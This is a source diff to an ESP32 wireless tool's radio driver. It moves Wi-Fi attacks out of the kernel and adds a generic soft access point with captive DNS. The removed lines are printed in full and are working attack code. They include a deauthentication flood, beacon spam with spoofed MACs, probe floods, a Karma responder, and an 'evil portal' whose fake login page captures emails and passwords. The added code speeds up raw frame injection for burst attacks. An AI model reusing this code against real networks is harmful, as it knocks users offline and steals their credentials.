@@ -5,6 +5,7 @@
 #include "nema/event/event_bus.h"
 #include <esp_wifi.h>
 #include <esp_netif.h>
+#include <esp_heap_caps.h>
 #include <sys/socket.h>
 #include <netinet/in.h>
 #include <arpa/inet.h>
@@ -19,48 +20,6 @@ namespace nema {
 // ── Deauth frame template (802.11 Management, Subtype=12 Deauthentication) ──
 // Offsets 4..9 = DA (broadcast or target), 10..15 = SA (spoofed BSSID),
 // 16..21 = BSSID, 24..25 = reason (7 = class 3 frame from nonassociated STA).
-static const uint8_t kDeauthTemplate[26] = {
-    0xC0, 0x00,                          // Frame control
-    0x00, 0x00,                          // Duration
-    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // DA: broadcast (fill per-target at runtime)
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // SA: spoofed BSSID (filled at runtime)
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // BSSID (same as SA)
-    0x00, 0x00,                          // Sequence control
-    0x07, 0x00,                          // Reason: class 3 frame from nonassociated
-};
-
-// ── Probe Request frame header (802.11 Management, Subtype=4) ────────────────
-// 24-byte header: DA=broadcast, SA=filled at runtime (randomised), BSSID=broadcast.
-// SSID IE and Supported Rates IE are appended in probeLoop().
-static const uint8_t kProbeReqHeader[24] = {
-    0x40, 0x00,                          // Frame control: probe request
-    0x00, 0x00,                          // Duration
-    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // DA: broadcast
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // SA: randomised per-burst (offset 10)
-    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // BSSID: wildcard
-    0x00, 0x00,                          // Sequence control
-};
-static const uint8_t kSupportedRates[10] = {
-    0x01, 0x08,
-    0x82, 0x84, 0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24,
-};
-
-// ── Beacon frame template (minimal, 802.11 Management, Subtype=8) ────────────
-// Bytes 10..11 = frame body offset; SSID IE at byte 36.
-static const uint8_t kBeaconTemplate[38] = {
-    0x80, 0x00,                          // Frame control: beacon
-    0xFF, 0xFF,                          // Duration
-    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // DA: broadcast
-    0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE, // SA (filled at runtime)
-    0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE, // BSSID (same as SA)
-    0x00, 0x00,                          // Sequence control
-    // Fixed params (8 bytes): timestamp 0, interval 100TU, caps 0x0401 (ESS+Short Slot)
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-    0x64, 0x00,
-    0x01, 0x04,
-    // SSID IE tag+len (filled at runtime), up to 32 bytes of SSID follow
-    0x00, 0x00,
-};
 
 // ── Monitor mode: promiscuous RX ──────────────────────────────────────────────
 // The promiscuous callback runs outside the WASM sandbox; it pushes raw frames
@@ -83,23 +42,20 @@ void Esp32WifiRadio::init(Runtime& rt) {
     // autoConnect() silently fails (radio in wrong mode), and esp_wifi_stop()
     // panics when settings tries to toggle WiFi off.
     rt.events().subscribe(events::AppHostExited, [this](const Event&) {
+        // Tear down anything the app left running on ANY exit path (Back, return,
+        // crash, forceQuit). Attacks + the captive portal now live in the app
+        // (Plan 91) — on exit they just stop. The kernel only restores the radio
+        // modes it owns: drop promiscuous, and if the app left a soft-AP up
+        // (e.g. a portal that crashed before wifi_ap_stop), restore STA so
+        // SystemWifiManager can reconnect.
         monitorClose();
-        std::lock_guard<std::mutex> g(mu_);
-        doDeauth_ = false;
-        doBeacon_ = false;
-        doProbe_  = false;
+        wifi_mode_t mode = WIFI_MODE_STA;
+        if (esp_wifi_get_mode(&mode) == ESP_OK && mode == WIFI_MODE_AP) apStop();
     });
-
-    loopThread_.start({"RadioLoop", 4096, 5, 0}, loopEntry, this);
 }
 
 void Esp32WifiRadio::stop() {
-    monitorClose();   // disable promiscuous before thread exits
-    doDeauth_ = false;
-    doBeacon_ = false;
-    doProbe_  = false;
-    loopThread_.requestStop();
-    loopThread_.join();
+    monitorClose();   // disable promiscuous
 }
 
 bool Esp32WifiRadio::parseBssid(std::string_view s, uint8_t out[6]) {
@@ -150,9 +106,14 @@ std::vector<RadioScanResult> Esp32WifiRadio::scan() {
 
 bool Esp32WifiRadio::monitorOpen(uint8_t ch) {
     s_radio = this;
-    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
+    // Promiscuous MUST be enabled before esp_wifi_set_channel(). Calling
+    // set_channel first fails with "STA is connecting/scanning" when the driver
+    // hasn't fully transitioned yet, leaving the radio on the AP's channel
+    // instead of the requested one → sniff screens always see 0 frames.
     esp_wifi_set_promiscuous_rx_cb(promiscRxCb);
     esp_wifi_set_promiscuous(true);
+    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
+    curChannel_ = ch;   // keep inject()'s channel cache in sync
     return true;
 }
 
@@ -160,166 +121,19 @@ void Esp32WifiRadio::monitorClose() {
     esp_wifi_set_promiscuous(false);
     esp_wifi_set_promiscuous_rx_cb(nullptr);
     s_radio = nullptr;
+    curChannel_ = 0;    // channel state no longer known
 }
 
 bool Esp32WifiRadio::inject(uint8_t ch, const uint8_t* frame, size_t len) {
     if (!frame || len == 0 || len > 2500) return false;
-    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
+    // Only re-tune when the channel actually changes. Re-tuning before every
+    // frame (the old behaviour) made rapid bursts like beacon spam fail — the
+    // radio spent its time hopping instead of transmitting. ch==0 → keep current.
+    if (ch != 0 && ch != curChannel_) {
+        esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
+        curChannel_ = ch;
+    }
     return esp_wifi_80211_tx(WIFI_IF_STA, frame, static_cast<int>(len), false) == ESP_OK;
-}
-
-bool Esp32WifiRadio::deauthStart(std::string_view bssid, uint8_t channel) {
-    std::lock_guard<std::mutex> g(mu_);
-    if (!parseBssid(bssid, deauthBssid_)) return false;
-    deauthChannel_ = channel;
-    doBeacon_      = false;
-    doProbe_       = false;
-    doDeauth_      = true;
-    return true;
-}
-
-bool Esp32WifiRadio::deauthStop() {
-    doDeauth_ = false;
-    return true;
-}
-
-bool Esp32WifiRadio::beaconSpamStart(const std::vector<std::string>& ssids) {
-    std::lock_guard<std::mutex> g(mu_);
-    beaconSsids_ = ssids;
-    doDeauth_    = false;
-    doProbe_     = false;
-    doBeacon_    = true;
-    return true;
-}
-
-bool Esp32WifiRadio::probeFloodStart(std::string_view ssid, uint8_t channel) {
-    std::lock_guard<std::mutex> g(mu_);
-    probeSsid_    = std::string(ssid);
-    probeChannel_ = channel;
-    doDeauth_     = false;
-    doBeacon_     = false;
-    doProbe_      = true;
-    return true;
-}
-
-bool Esp32WifiRadio::probeFloodStop() {
-    doProbe_ = false;
-    return true;
-}
-
-bool Esp32WifiRadio::beaconSpamStop() {
-    doBeacon_ = false;
-    return true;
-}
-
-void Esp32WifiRadio::loopEntry(void* self) {
-    auto* r = static_cast<Esp32WifiRadio*>(self);
-    while (!r->loopThread_.shouldStop()) {
-        if      (r->doDeauth_) r->deauthLoop();
-        else if (r->doBeacon_) r->beaconLoop();
-        else if (r->doProbe_)  r->probeLoop();
-        else if (r->doKarma_)  r->karmaLoop();
-        else    Thread::sleepMs(10);
-    }
-}
-
-void Esp32WifiRadio::deauthLoop() {
-    uint8_t frame[26];
-    uint8_t bssid[6];
-    uint8_t ch;
-    {
-        std::lock_guard<std::mutex> g(mu_);
-        std::memcpy(bssid, deauthBssid_, 6);
-        ch = deauthChannel_;
-    }
-
-    std::memcpy(frame, kDeauthTemplate, sizeof(frame));
-    std::memcpy(frame + 4,  bssid, 6);  // DA (broadcast already; override for unicast)
-    std::memcpy(frame + 10, bssid, 6);  // SA = spoofed BSSID
-    std::memcpy(frame + 16, bssid, 6);  // BSSID
-
-    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
-    esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), false);
-
-    char buf[64];
-    std::snprintf(buf, sizeof(buf),
-                  "{\"bssid\":\"%02X:%02X:%02X:%02X:%02X:%02X\",\"channel\":%d}",
-                  bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5], (int)ch);
-    pushEvent("deauth_sent", buf);
-
-    Thread::sleepMs(100);
-}
-
-void Esp32WifiRadio::probeLoop() {
-    std::string ssid;
-    uint8_t ch;
-    {
-        std::lock_guard<std::mutex> g(mu_);
-        ssid = probeSsid_;
-        ch   = probeChannel_;
-    }
-
-    // Rotate the last SA byte to simulate different source devices.
-    static uint8_t probeSeq = 0;
-    uint8_t frame[100];
-    size_t pos = sizeof(kProbeReqHeader);
-    std::memcpy(frame, kProbeReqHeader, sizeof(kProbeReqHeader));
-    frame[10] = 0xDE; frame[11] = 0xAD; frame[12] = 0xBE;
-    frame[13] = 0xEF; frame[14] = 0xCA; frame[15] = probeSeq++;
-
-    // SSID IE: tag=0x00, len, ssid bytes (len=0 → wildcard)
-    size_t ssidLen = ssid.size() > 32 ? 32 : ssid.size();
-    frame[pos++] = 0x00;
-    frame[pos++] = static_cast<uint8_t>(ssidLen);
-    std::memcpy(frame + pos, ssid.c_str(), ssidLen);
-    pos += ssidLen;
-
-    // Supported Rates IE
-    std::memcpy(frame + pos, kSupportedRates, sizeof(kSupportedRates));
-    pos += sizeof(kSupportedRates);
-
-    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
-    esp_wifi_80211_tx(WIFI_IF_STA, frame, static_cast<int>(pos), false);
-
-    pushEvent("probe_sent", "{}");
-    Thread::sleepMs(50);  // 20 Hz
-}
-
-void Esp32WifiRadio::beaconLoop() {
-    std::vector<std::string> ssids;
-    {
-        std::lock_guard<std::mutex> g(mu_);
-        ssids = beaconSsids_;
-    }
-
-    // Fake MAC: rotate through 0xDE:AD:BE:EF:CA:XX
-    static uint8_t fakeMac[6] = {0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0x00};
-
-    for (size_t i = 0; i < ssids.size(); ++i) {
-        if (loopThread_.shouldStop() || !doBeacon_) break;
-        fakeMac[5] = static_cast<uint8_t>(i & 0xFF);
-
-        const std::string& ssid = ssids[i];
-        size_t ssidLen = ssid.size() > 32 ? 32 : ssid.size();
-
-        // Build beacon: template + SSID IE (tag 0x00, len, ssid bytes)
-        std::vector<uint8_t> beacon(kBeaconTemplate,
-                                    kBeaconTemplate + sizeof(kBeaconTemplate));
-        std::memcpy(beacon.data() + 10, fakeMac, 6);
-        std::memcpy(beacon.data() + 16, fakeMac, 6);
-        beacon[36] = 0x00;                        // SSID IE tag
-        beacon[37] = static_cast<uint8_t>(ssidLen);
-        for (size_t j = 0; j < ssidLen; ++j)
-            beacon.push_back(static_cast<uint8_t>(ssid[j]));
-
-        esp_wifi_80211_tx(WIFI_IF_STA,
-                          beacon.data(), static_cast<int>(beacon.size()), false);
-
-        char buf[64];
-        std::snprintf(buf, sizeof(buf), "{\"ssid\":\"%s\"}", ssid.c_str());
-        pushEvent("beacon_sent", buf);
-    }
-    Thread::sleepMs(100);
 }
 
 // ── setMac ───────────────────────────────────────────────────────────────────
@@ -331,223 +145,69 @@ bool Esp32WifiRadio::setMac(std::string_view mac) {
     return esp_wifi_set_mac(WIFI_IF_STA, bytes) == ESP_OK;
 }
 
-// ── Karma attack ──────────────────────────────────────────────────────────────
-// Uses the existing monitor ring: karmaStart() enables promiscuous (monitorOpen),
-// then the Core-0 loop drains frames and replies to probe requests.
+// ── Soft AP (generic primitive — Plan 91) ──────────────────────────────────
+// EXACT sequence the (working) evil portal used: clear promiscuous, create the
+// AP netif+DHCP once, then stop -> set_mode(AP) -> set_config -> start. Merely
+// set_mode/set_config on a running STA does NOT start the beacon — the start()
+// after the reconfigure is what makes the SSID appear. Do not reorder this.
+bool Esp32WifiRadio::apStart(std::string_view ssid, uint8_t channel, bool open) {
+    (void)open;  // only open auth supported for now (captive portals)
+    esp_wifi_set_promiscuous(false);
+    esp_wifi_set_promiscuous_rx_cb(nullptr);
 
-bool Esp32WifiRadio::karmaStart() {
-    std::lock_guard<std::mutex> g(mu_);
-    doDeauth_ = false; doBeacon_ = false; doProbe_ = false;
-    doKarma_  = true;
-    monitorOpen(1);
-    return true;
-}
-
-bool Esp32WifiRadio::karmaStop() {
-    doKarma_ = false;
-    monitorClose();
-    return true;
-}
-
-// Probe-response frame header (36 bytes): DA/SA/BSSID filled at runtime.
-static const uint8_t kProbeRespFixed[36] = {
-    0x50, 0x00,                          // FC: probe response (type=0 subtype=5)
-    0x00, 0x00,                          // Duration
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // DA  (filled from probe SA)
-    0xDE, 0xAD, 0xBE, 0xEF, 0xC0, 0xDE,  // SA  (fake BSSID — varied at runtime)
-    0xDE, 0xAD, 0xBE, 0xEF, 0xC0, 0xDE,  // BSSID
-    0x00, 0x00,                          // Seq ctrl
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // timestamp
-    0x64, 0x00,                          // beacon interval 100 TU
-    0x11, 0x04,                          // capability: ESS + Short Slot
-};
-
-static const uint8_t kProbeRespRates[10] = {
-    0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24,
-};
-
-void Esp32WifiRadio::handleKarmaFrame(const uint8_t* f, int n) {
-    if (n < 26) return;
-    if (((f[0] >> 2) & 0x3) != 0 || ((f[0] >> 4) & 0xF) != 4) return; // not probe req
-    if (f[24] != 0x00) return;  // no SSID tag
-    uint8_t ssid_len = f[25];
-    if (ssid_len == 0 || ssid_len > 32 || 26 + (int)ssid_len > n) return;
-
-    uint8_t resp[200];
-    std::memcpy(resp, kProbeRespFixed, sizeof(kProbeRespFixed));
-    std::memcpy(resp + 4, f + 10, 6);   // DA = probe request SA
-    resp[15] = f[11] ^ 0xAA;            // vary fake BSSID last byte
-    resp[21] = resp[15];
-    size_t pos = sizeof(kProbeRespFixed);
-    resp[pos++] = 0x00;
-    resp[pos++] = ssid_len;
-    std::memcpy(resp + pos, f + 26, ssid_len); pos += ssid_len;
-    std::memcpy(resp + pos, kProbeRespRates, sizeof(kProbeRespRates));
-    pos += sizeof(kProbeRespRates);
-
-    esp_wifi_80211_tx(WIFI_IF_STA, resp, static_cast<int>(pos), false);
-
-    char ssid[33]; std::memcpy(ssid, f + 26, ssid_len); ssid[ssid_len] = '\0';
-    char buf[120];
-    std::snprintf(buf, sizeof(buf),
-        "{\"ssid\":\"%s\",\"sta\":\"%02X:%02X:%02X:%02X:%02X:%02X\"}",
-        ssid, f[10], f[11], f[12], f[13], f[14], f[15]);
-    pushEvent("karma_hit", buf);
-}
-
-void Esp32WifiRadio::karmaLoop() {
-    uint8_t frame[2500];
-    int n = monitorRead(frame, sizeof(frame), 100);
-    if (n > 0) handleKarmaFrame(frame, n);
-}
-
-// ── Evil portal ───────────────────────────────────────────────────────────────
-
-bool Esp32WifiRadio::evilPortalStart(std::string_view ssid,
-                                      const char* html, size_t htmlLen) {
-    if (epRunning_) return false;
-    epSsid_ = std::string(ssid);
-    epHtml_ = (html && htmlLen > 0)
-              ? std::string(html, htmlLen)
-              : std::string();
-    epRunning_ = true;
-    epThread_.start({"EvilPortal", 8192, 5, 0}, epThreadEntry, this);
-    return true;
-}
-
-bool Esp32WifiRadio::evilPortalStop() {
-    epRunning_ = false;
-    epThread_.join();
-    return true;
-}
-
-static const char kPortalPage[] =
-    "<!DOCTYPE html><html><head><title>WiFi Portal</title>"
-    "<style>body{font-family:sans-serif;max-width:400px;margin:60px auto;text-align:center}"
-    "input{width:100%;padding:8px;margin:6px 0;box-sizing:border-box;border:1px solid #ccc;border-radius:4px}"
-    "button{background:#0070f3;color:#fff;padding:10px 32px;border:none;border-radius:4px;cursor:pointer;font-size:16px}"
-    "h2{color:#333}</style></head><body>"
-    "<h2>Network Login</h2><p>Sign in to get internet access</p>"
-    "<form method=POST action=/submit>"
-    "<input name=email type=email placeholder='Email address' required>"
-    "<input name=pass type=password placeholder='Password' required>"
-    "<br><button type=submit>Connect</button>"
-    "</form></body></html>";
-
-static int epDnsReply(const uint8_t* q, int qlen, uint8_t* r, int rmax) {
-    if (qlen < 12 || rmax < qlen + 16) return 0;
-    std::memcpy(r, q, qlen);
-    r[2] = 0x81; r[3] = 0x80;
-    r[6] = 0x00; r[7] = 0x01;
-    r[8] = r[9] = r[10] = r[11] = 0;
-    int pos = qlen;
-    r[pos++] = 0xC0; r[pos++] = 0x0C;
-    r[pos++] = 0x00; r[pos++] = 0x01;
-    r[pos++] = 0x00; r[pos++] = 0x01;
-    r[pos++] = 0x00; r[pos++] = 0x00; r[pos++] = 0x00; r[pos++] = 0x01;
-    r[pos++] = 0x00; r[pos++] = 0x04;
-    r[pos++] = 192; r[pos++] = 168; r[pos++] = 4; r[pos++] = 1;
-    return pos;
-}
-
-void Esp32WifiRadio::epThreadEntry(void* self) {
-    static_cast<Esp32WifiRadio*>(self)->epRun();
-}
-
-void Esp32WifiRadio::epRun() {
-    // Switch to APSTA mode and configure soft AP.
-    wifi_mode_t prev = WIFI_MODE_STA;
-    esp_wifi_get_mode(&prev);
-    esp_wifi_set_mode(WIFI_MODE_APSTA);
-
-    wifi_config_t ap_cfg = {};
-    std::strncpy(reinterpret_cast<char*>(ap_cfg.ap.ssid),
-                 epSsid_.c_str(), sizeof(ap_cfg.ap.ssid) - 1);
-    ap_cfg.ap.ssid_len      = static_cast<uint8_t>(
-        epSsid_.size() < 32 ? epSsid_.size() : 32);
-    ap_cfg.ap.channel       = 6;
-    ap_cfg.ap.authmode      = WIFI_AUTH_OPEN;
-    ap_cfg.ap.max_connection = 4;
-    esp_wifi_set_config(WIFI_IF_AP, &ap_cfg);
-
-    const char* html     = epHtml_.empty() ? kPortalPage : epHtml_.c_str();
-    int         html_len = epHtml_.empty()
-                           ? static_cast<int>(sizeof(kPortalPage) - 1)
-                           : static_cast<int>(epHtml_.size());
-
-    // DNS server socket (UDP/53)
-    int dns_sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
-    struct sockaddr_in sa = {};
-    sa.sin_family = AF_INET; sa.sin_addr.s_addr = INADDR_ANY;
-    sa.sin_port = htons(53);
-    bind(dns_sock, reinterpret_cast<struct sockaddr*>(&sa), sizeof(sa));
-    int fl = fcntl(dns_sock, F_GETFL, 0);
-    fcntl(dns_sock, F_SETFL, fl | O_NONBLOCK);
-
-    // HTTP server socket (TCP/80)
-    int http_sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
-    int opt = 1; setsockopt(http_sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
-    sa.sin_port = htons(80);
-    bind(http_sock, reinterpret_cast<struct sockaddr*>(&sa), sizeof(sa));
-    listen(http_sock, 4);
-    fl = fcntl(http_sock, F_GETFL, 0);
-    fcntl(http_sock, F_SETFL, fl | O_NONBLOCK);
-
-    uint8_t dns_q[512], dns_r[600];
-    char    http_buf[1280];
-
-    while (epRunning_) {
-        // Handle DNS
-        struct sockaddr_in cli = {};
-        socklen_t clen = sizeof(cli);
-        int qn = recvfrom(dns_sock, dns_q, sizeof(dns_q), 0,
-                          reinterpret_cast<struct sockaddr*>(&cli), &clen);
-        if (qn >= 12) {
-            int rn = epDnsReply(dns_q, qn, dns_r, sizeof(dns_r));
-            if (rn > 0)
-                sendto(dns_sock, dns_r, rn, 0,
-                       reinterpret_cast<struct sockaddr*>(&cli), clen);
-        }
-
-        // Handle HTTP
-        int csock = accept(http_sock, nullptr, nullptr);
-        if (csock >= 0) {
-            int n = recv(csock, http_buf, sizeof(http_buf) - 1, 0);
-            if (n > 0) {
-                http_buf[n] = '\0';
-                bool is_post   = (http_buf[0] == 'P');
-                bool is_submit = is_post && std::strstr(http_buf, "/submit");
-                if (is_submit) {
-                    const char* body = std::strstr(http_buf, "\r\n\r\n");
-                    if (body) {
-                        body += 4;
-                        char evbuf[300];
-                        std::snprintf(evbuf, sizeof(evbuf),
-                                      "{\"data\":\"%s\"}", body);
-                        pushEvent("ep_creds", evbuf);
-                    }
-                    const char* thanks =
-                        "HTTP/1.0 200 OK\r\nContent-Type:text/html\r\n\r\n"
-                        "<html><body><h2>Connected!</h2>"
-                        "<p>You are now connected.</p></body></html>";
-                    send(csock, thanks, std::strlen(thanks), 0);
-                } else {
-                    char hdr[128];
-                    std::snprintf(hdr, sizeof(hdr),
-                        "HTTP/1.0 200 OK\r\nContent-Type:text/html\r\n"
-                        "Content-Length:%d\r\n\r\n", html_len);
-                    send(csock, hdr, std::strlen(hdr), 0);
-                    send(csock, html, html_len, 0);
-                }
-            }
-            close(csock);
-        }
-        Thread::sleepMs(10);
+    static esp_netif_t* s_ap_netif = nullptr;
+    if (!s_ap_netif) {
+        s_ap_netif = esp_netif_get_handle_from_ifkey("WIFI_AP_DEF");
+        if (!s_ap_netif) s_ap_netif = esp_netif_create_default_wifi_ap();
     }
 
-    close(http_sock);
-    close(dns_sock);
-    esp_wifi_set_mode(prev);
+    esp_wifi_stop();
+    esp_err_t mode_rc = esp_wifi_set_mode(WIFI_MODE_AP);
+
+    std::string s(ssid);
+    wifi_config_t ap_cfg = {};
+    std::strncpy(reinterpret_cast<char*>(ap_cfg.ap.ssid), s.c_str(),
+                 sizeof(ap_cfg.ap.ssid) - 1);
+    ap_cfg.ap.ssid_len        = static_cast<uint8_t>(s.size() < 32 ? s.size() : 32);
+    ap_cfg.ap.channel         = channel ? channel : 1;
+    ap_cfg.ap.authmode        = WIFI_AUTH_OPEN;
+    ap_cfg.ap.ssid_hidden     = 0;
+    ap_cfg.ap.max_connection  = 4;
+    ap_cfg.ap.beacon_interval = 100;
+    esp_err_t cfg_rc   = esp_wifi_set_config(WIFI_IF_AP, &ap_cfg);
+    esp_err_t start_rc = esp_wifi_start();
+
+    // Make the AP's DHCP server hand out 192.168.4.1 as the DNS server. Without
+    // this, clients keep their cellular/cached DNS, so a captive-portal app's
+    // DNS catch-all is never queried and the OS never shows the login page —
+    // the client just times out and leaves. This is what makes captive work.
+    if (s_ap_netif) {
+        esp_netif_dhcps_stop(s_ap_netif);
+        esp_netif_dns_info_t dns = {};
+        dns.ip.type            = ESP_IPADDR_TYPE_V4;
+        dns.ip.u_addr.ip4.addr = inet_addr("192.168.4.1");
+        esp_netif_set_dns_info(s_ap_netif, ESP_NETIF_DNS_MAIN, &dns);
+        uint8_t offer_dns = 1;   // DHCP offers the DNS option to clients
+        esp_netif_dhcps_option(s_ap_netif, ESP_NETIF_OP_SET,
+                               ESP_NETIF_DOMAIN_NAME_SERVER,
+                               &offer_dns, sizeof(offer_dns));
+        esp_netif_dhcps_start(s_ap_netif);
+    }
+
+    if (rt_) rt_->log().info("WifiAP", "started",
+        {{"ssid", s}, {"netif", s_ap_netif ? "ok" : "FAILED"},
+         {"set_mode", esp_err_to_name(mode_rc)},
+         {"set_cfg", esp_err_to_name(cfg_rc)},
+         {"start", esp_err_to_name(start_rc)}});
+    return start_rc == ESP_OK;
+}
+
+bool Esp32WifiRadio::apStop() {
+    esp_wifi_stop();
+    esp_wifi_set_mode(WIFI_MODE_STA);
+    esp_wifi_start();   // STA reconnect is driven by SystemWifiManager on lease release
+    curChannel_ = 0;    // AP cycle changed the radio — force inject() to re-tune
+    return true;
 }
 
 // ── staStatus ────────────────────────────────────────────────────────────────
